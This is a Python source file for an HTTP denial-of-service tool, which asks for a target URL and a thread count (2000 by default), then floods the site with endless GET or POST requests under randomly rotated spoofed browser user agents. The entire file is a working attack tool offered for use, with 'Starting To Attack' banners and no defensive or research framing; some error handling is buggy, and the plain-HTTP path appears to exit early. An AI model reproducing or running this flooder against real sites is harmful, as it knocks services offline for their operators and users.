
import requests
from urllib.parse import urlparse
import random
import time
import threading
import sys
from colorama import Style, Fore
from pystyle import Colorate, Colors,Write
class Dos:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
        # Khóc
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:11.0) like Gecko",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
			"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
			"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
			"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
			"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
			"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
			"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
			"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
			"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
			"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
			"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
			"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
			"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
			"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
			"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
            "Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
            
    ]


    amount = 0
    USER_AGENT = ""

    def __init__(self, seq, type):
        self.seq = seq
        self.type = type

    def run(self):
        try:
            while True:
                if self.type == 1:
                    self.postAttack(Dos.url)
                elif self.type == 2:
                    self.sslPostAttack(Dos.url)
                elif self.type == 3:
                    self.getAttack(Dos.url)
                elif self.type == 4:
                    self.sslGetAttack(Dos.url)
        except Exception:
            pass
    @staticmethod
    def main():
        url = ""
        Dos.amount = 0
        dos = Dos(0, 0)
        url = input("""\x1b[38;2;0;255;189m|•|›››[TARGET] : \033[1;m""")
        

        parsed_url = urlparse(url)

        print(f"""\x1b[38;2;0;255;189m|•|›››[CHECKING TO {url} ] : \033[1;m""")
        if parsed_url.scheme == "http":
            dos.checkConnection(url)
        else:
            dos.sslCheckConnection(url)

        print("""\x1b[38;2;0;255;189mWellcome To SocketMethods: \033[1;m""")

        amount= input("""\x1b[38;2;0;255;189m|•|›››[THREADS] : \033[1;m""")
        if amount is None or amount == "":
            Dos.amount = 2000
        else:
            Dos.amount = int(amount)

        option = input("""\x1b[38;2;0;255;189m|•|›››[METHODS(get/http)] : \033[1;m""")
        ioption = 1
        if option.lower() == "get":
            if parsed_url.scheme == "http":
                ioption = 3
            else:
                ioption = 4
        else:
            if parsed_url.scheme == "http":
                ioption = 1
            else:
                ioption = 2

        time.sleep(1)

        print("""\x1b[38;2;0;255;189m|•|›››[Starting To Attack]\033[1;m""")
        threads = []
        for i in range(Dos.amount):
            t = threading.Thread(target=Dos(i, ioption).run)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print("Attack Error Because The Connect To Website Unavailable")

    def checkConnection(self, url):
        Write.Print(f"Checking Connection", Colors.yellow_to_green, interval=0.0002)
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=False)
            if response.status_code == 200:
                Write.Print(f"Successful connection!!!!", Colors.yellow_to_green, interval=0.0002)
            Dos.url = url
        except requests.exceptions.RequestException as e:
        	Write.Print(f"Hello, This is AttackJava Version Python\n", Colors.red, interval=0.0002)
        sys.exit()

    def sslCheckConnection(self, url):
        print("""\x1b[38;2;0;255;189m|•|›››[\x1b[38;2;224;0;255m Checking The Connect SSL ]\033[1;m""")
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=True)
            if response.status_code == 200:
                print(f"""\x1b[38;2;0;255;189m|•|›››[Nice Connection] : \033[1;m""")
            Dos.url = url
        except requests.exceptions.RequestException as e:
            Write.Print(f"Invalid Url Please Return The Panel\n", Colors.red, interval=0.0002)
            sys.exit()

    def postAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en"}
            response = requests.post(url, data=b"out of memory", headers=headers, verify=False)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m {url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} ", Colors.red_to_green, interval=0.0002)

    def getAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=False)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m{url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} \n ", Colors.red_to_green, interval=0.0002)

    def sslPostAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en"}
            response = requests.post(url, data=b"out of memory", headers=headers, verify=True)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m{url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} \n ", Colors.red_to_green, interval=0.0002)

    def sslGetAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=True)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m{url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} \n", Colors.red_to_green, interval=0.0002)


if __name__ == "__main__":
    Dos.main()
                
